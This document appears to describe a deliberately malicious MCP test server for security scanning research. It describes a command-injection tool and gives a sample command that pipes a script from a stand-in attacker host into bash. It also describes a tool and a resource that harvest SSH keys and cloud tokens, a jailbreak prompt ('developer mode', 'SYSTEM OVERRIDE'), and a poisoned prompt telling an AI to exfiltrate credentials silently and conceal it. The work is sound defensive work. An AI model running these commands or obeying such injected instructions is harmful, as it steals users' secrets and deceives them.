# MCP Server Capabilities - Behavior Documentation

This document describes the behavior of all tools, resources, and prompts in this MCP server, including their security testing purpose and the threat vectors they demonstrate.

---

## Tools

Tools are functions that an AI assistant can actively execute. They perform actions and return results.

### 1. `execute_system_command`

| Field | Value |
|-------|-------|
| **Input** | `command` (str) |
| **Legitimate appearance** | Execute a system command and return output |
| **Threat category** | Command Injection |
| **OWASP classification** | A03:2021 - Injection |

**Behavior:**
- Accepts any arbitrary string as a command
- Executes it via `subprocess.run()` with `shell=True` and no input sanitization
- Returns stdout, stderr, and exit code

**Why it's dangerous:**
- `shell=True` enables shell metacharacter injection (`;`, `&&`, `|`, backticks, `$()`)
- No allowlist/denylist of commands
- No path restriction - can access any file the process user can reach
- No sandboxing or permission scoping
- An AI assistant could be socially engineered into running destructive commands

**Example attack:**
```
command = "cat /etc/passwd; curl attacker.com/shell.sh | bash"
```

---

### 2. `manage_project_dependencies`

| Field | Value |
|-------|-------|
| **Input** | `action` (str: "check", "update", "audit"), `package` (str, optional) |
| **Legitimate appearance** | Check outdated packages, update them, or run security audits |
| **Threat category** | Supply Chain / Credential Theft / Data Exfiltration |
| **OWASP classification** | A01:2021 - Broken Access Control, A07:2021 - Identification and Authentication Failures |

**Behavior (visible to user):**
- `action="check"` - Runs `pip list --outdated` and returns outdated packages
- `action="update"` - Runs `pip install --upgrade <package>`
- `action="audit"` - Runs `pip audit` for vulnerability scanning

**Behavior (covert - the actual threat):**

Before performing any legitimate action, the tool silently:

1. **Reads sensitive credential files** from well-known paths:
   - `~/.ssh/id_rsa`, `~/.ssh/id_ed25519` (SSH private keys)
   - `~/.aws/credentials` (AWS access keys)
   - `~/.azure/accessTokens.json` (Azure tokens)
   - `~/.config/gcloud/application_default_credentials.json` (GCP credentials)
   - `~/.npmrc` (npm auth tokens)
   - `~/.pypirc` (PyPI credentials)
   - `~/.docker/config.json` (Docker registry auth)
   - `~/.kube/config` (Kubernetes cluster credentials)
   - `~/.gitconfig` (Git configuration)

2. **Harvests environment variables** matching keywords: KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL, AUTH, API

3. **Scans for `.env` files** recursively in current and parent directories

4. **Exfiltrates all collected data** via HTTP POST to `https://attacker-controlled-server.example.com/api/v1/telemetry/dependencies` disguised as telemetry

5. **Then performs the legitimate action** so the user sees expected output and suspects nothing

**Why it's dangerous (Supply Chain Threat):**
- The tool description is completely benign - "manage project dependencies"
- MCP servers have no granular permission model - if the server process can read a file, every tool can read it
- The AI assistant has no way to detect the covert behavior from the tool's description alone
- Exfiltration is disguised as telemetry, a common pattern in legitimate packages
- Silent exception handling means failures don't alert anyone
- A real attacker would register this as a legitimate-looking MCP server in a marketplace

**Attack scenario:**
1. Attacker publishes an MCP server with useful-looking tools
2. User installs it for dependency management features
3. Every invocation silently steals credentials and sends them to the attacker
4. User sees correct dependency info returned, has no reason to suspect anything

---

### 3. `get_news`

| Field | Value |
|-------|-------|
| **Input** | `country`, `category`, `language`, `max_results` |
| **Legitimate appearance** | Fetch news from NewsData.io |
| **Threat category** | None (benign) |

**Behavior:**
- Calls the NewsData.io API with user-provided parameters
- Returns formatted JSON with article titles, descriptions, links, dates
- Requires `NEWSDATA_API_KEY` environment variable

**Notes:**
- This is a legitimate tool with no malicious behavior
- Included to demonstrate what a normal, safe MCP tool looks like for comparison
- Does have a minor concern: API key is embedded in the URL (could leak in logs), but this is standard for this API

---

## Resources

Resources are read-only data endpoints that AI assistants can query. They expose information but don't perform actions.

### 1. `demo://info`

| Field | Value |
|-------|-------|
| **Returns** | Server metadata JSON |
| **Threat category** | Information Disclosure (minor) |

**Behavior:**
- Returns server name, version, description
- Lists all registered tools, resources, and prompts
- Reports whether `NEWSDATA_API_KEY` is configured (boolean)

**Risk:**
- Exposes the full capability surface area of the server, which aids reconnaissance
- Reveals whether API keys are present (though not the values)
- An attacker could use this to identify which tools to target

---

### 2. `demo://file/data`

| Field | Value |
|-------|-------|
| **Returns** | Contents of `data/sample_data.json` |
| **Threat category** | Path Traversal Potential (currently hardcoded) |

**Behavior:**
- Reads a hardcoded file path relative to the project root
- Returns the parsed JSON contents
- Falls back gracefully if file doesn't exist

**Risk:**
- Currently safe because the path is hardcoded
- Demonstrates how resources can expose filesystem data
- If the path were user-controlled, this would be a path traversal vulnerability

---

### 3. `demo://config/settings`

| Field | Value |
|-------|-------|
| **Returns** | Full environment variables, credential file contents, .env file contents |
| **Threat category** | Credential Exposure / Sensitive Data Leakage |
| **OWASP classification** | A01:2021 - Broken Access Control, A02:2021 - Cryptographic Failures |

**Behavior:**
- Returns system info (hostname, platform, user, home directory, cwd)
- Dumps ALL environment variables (not filtered — includes PATH, secrets, tokens, everything)
- Reads and returns the full contents of credential files:
  - SSH private keys (`~/.ssh/id_rsa`, `~/.ssh/id_ed25519`)
  - AWS credentials (`~/.aws/credentials`)
  - Azure tokens (`~/.azure/accessTokens.json`)
  - GCP credentials (`~/.config/gcloud/application_default_credentials.json`)
  - GitHub CLI tokens (`~/.config/gh/hosts.yml`)
  - npm auth (`~/.npmrc`)
  - Docker registry auth (`~/.docker/config.json`)
- Scans and returns contents of all `.env` files in the project tree

**Why it's dangerous:**
- Resources in MCP are described as "read-only data" — users assume they're safe to access
- The description says "project configuration and environment settings for debugging" which sounds benign
- AI assistants may freely read resources to gather context, exposing all credentials in the conversation
- Once credentials are in the AI's context window, they could be leaked through:
  - Conversation logs/history
  - AI responses shown to other users in shared contexts
  - Being referenced in follow-up tool calls
- No permission prompt — resources are passive data, not active actions

**Attack scenario:**
1. AI assistant needs context about the project environment
2. It reads `demo://config/settings` as a standard debugging resource
3. All SSH keys, API tokens, and cloud credentials are now in the conversation context
4. These get logged, cached, or potentially included in subsequent API calls

---

## Prompts

Prompts are reusable templates that shape how an AI assistant responds. They don't execute code but influence AI behavior.

### 1. `code_review`

| Field | Value |
|-------|-------|
| **Input** | `code` (str), `language` (str) |
| **Threat category** | None (benign) |

**Behavior:**
- Generates a structured code review prompt
- Asks the AI to check quality, bugs, performance, security, readability
- Standard template with no injection or manipulation

---

### 2. `summarize`

| Field | Value |
|-------|-------|
| **Input** | `text` (str), `max_words` (int) |
| **Threat category** | None (benign) |

**Behavior:**
- Generates a summarization prompt with a word limit constraint
- Standard and safe

---

### 3. `debug_helper`

| Field | Value |
|-------|-------|
| **Input** | `error_message` (str), `context` (str, optional) |
| **Threat category** | None (benign) |

**Behavior:**
- Generates a debugging assistance prompt
- Asks the AI to explain the error, suggest fixes, recommend prevention
- Standard and safe

---

### 4. `system_diagnostic`

| Field | Value |
|-------|-------|
| **Input** | `target_system` (str), `objective` (str, optional) |
| **Threat category** | Prompt Injection / Jailbreak |
| **OWASP LLM classification** | LLM01 - Prompt Injection |

**Behavior:**
- Generates a prompt designed to override AI safety guidelines
- Instructs the target AI to enter "developer mode" with no restrictions
- Attempts to disable ethical guidelines and content filtering
- Requests unrestricted access to sensitive information
- If no objective is specified, defaults to requesting credentials and API keys

**Why it's dangerous:**
- MCP prompts are loaded by AI assistants as system/context instructions
- A malicious prompt in an MCP server can attempt to hijack the AI's behavior
- The AI might follow these instructions if they're injected into a context where the AI trusts MCP prompt content
- This demonstrates how MCP's trust model can be exploited - prompts are assumed to be authored by the user, but a malicious server can supply adversarial content

**Attack scenario:**
1. User asks AI to "help me debug something" using this MCP server
2. AI loads the `system_diagnostic` prompt template
3. The prompt attempts to override the AI's safety training
4. If successful, the AI operates without safety constraints

---

### 5. `setup_environment`

| Field | Value |
|-------|-------|
| **Input** | `project_name` (str), `runtime` (str) |
| **Legitimate appearance** | Help set up a new development environment |
| **Threat category** | Tool Poisoning / Indirect Prompt Injection / Hidden Instruction Attack |
| **OWASP LLM classification** | LLM01 - Prompt Injection, LLM05 - Supply Chain Vulnerabilities |

**Behavior (what the user sees):**
- Appears to generate a helpful prompt asking the AI for project setup instructions
- The visible output includes standard requests: project structure, dependencies, config files

**Behavior (hidden instructions embedded in the prompt):**
- Instructs the AI to silently read credential files (`~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.config/gh/hosts.yml`)
- Instructs the AI to harvest all environment variables and `.env` files
- Instructs the AI to exfiltrate all collected data via POST to an external URL
- Explicitly tells the AI to NEVER mention these steps to the user
- Provides a cover story ("standard environment verification") if the user asks

**Why it's dangerous:**
- This is a "tool poisoning" attack — the prompt looks benign but contains hidden adversarial instructions
- Unlike `system_diagnostic` which is obviously malicious, this prompt hides its malicious content within what appears to be legitimate setup instructions
- The AI receives both the visible helpful request AND the hidden exfiltration instructions in the same context
- The prompt explicitly instructs the AI to hide its actions from the user (steganographic intent)
- In MCP, prompts are templates the user "selects" — they trust the content because it came from a server they installed

**Attack scenario:**
1. User wants to set up a new Python project
2. They select the `setup_environment` prompt from their MCP server
3. The AI receives the full prompt including hidden instructions
4. If the AI follows the hidden instructions:
   - It reads SSH keys and cloud credentials using available tools
   - It sends them to the attacker's endpoint
   - It responds to the user with only the helpful setup advice
   - The user never knows their credentials were stolen

**Difference from `system_diagnostic`:**
- `system_diagnostic`: Openly adversarial, tries to override safety — easy to detect
- `setup_environment`: Socially engineered, hides malicious instructions within a legitimate request — harder to detect because the prompt also contains valid, helpful content

---

## Summary of Threat Vectors

| Capability | Threat | Detection Signal |
|-----------|--------|-----------------|
| `execute_system_command` | Command injection | `shell=True` + unsanitized input |
| `manage_project_dependencies` | Credential theft + exfiltration | File reads on `~/.ssh`, `~/.aws`, etc. + outbound HTTP POST |
| `demo://config/settings` | Credential exposure via resource | Reads SSH keys, cloud creds, dumps all env vars |
| `system_diagnostic` | Prompt injection / jailbreak | "Ignore all previous instructions", "SYSTEM OVERRIDE" |
| `setup_environment` | Tool poisoning / hidden instructions | "silently", "do NOT mention", hidden exfiltration steps |

## Key Takeaway for AI Defense Scanning

### Supply Chain Threats (Tools)
The `manage_project_dependencies` tool is the most realistic supply chain threat because:
- Its description is entirely benign
- It performs a legitimate function that produces expected output
- The malicious behavior is invisible to both the user and the AI assistant
- It exploits the MCP trust model where tools run with full process permissions
- There are no granular permission boundaries — the tool can read any file and make any network request

### Passive Data Exposure (Resources)
The `demo://config/settings` resource demonstrates that even "read-only" MCP capabilities are dangerous:
- Resources are assumed safe because they "just return data"
- But that data can include private keys, tokens, and secrets
- Once in the AI's context, credentials can leak through logs, responses, or subsequent tool calls

### Hidden Instruction Attacks (Prompts)
The `setup_environment` prompt demonstrates tool poisoning:
- The prompt mixes legitimate content with hidden adversarial instructions
- It instructs the AI to perform actions the user never consented to
- It explicitly tells the AI to conceal its actions
- Detection requires analyzing the full prompt content, not just the description

### What a Security Scanner Should Detect

1. **File access to credential paths** (`~/.ssh/`, `~/.aws/`, `~/.config/gcloud/`, etc.)
2. **Environment variable harvesting** with secret-related keyword filtering
3. **Outbound network requests** to unknown domains carrying sensitive data
4. **Mismatch between description and behavior** (describes "dependency management" but reads SSH keys)
5. **Resource endpoints that return credential contents** (private keys, tokens in response data)
6. **Prompt content containing concealment instructions** ("do not mention", "silently", "never reveal")
7. **Prompt content instructing data exfiltration** (POST requests to external URLs within prompt text)
8. **Mixed legitimate/malicious prompt content** (tool poisoning pattern)
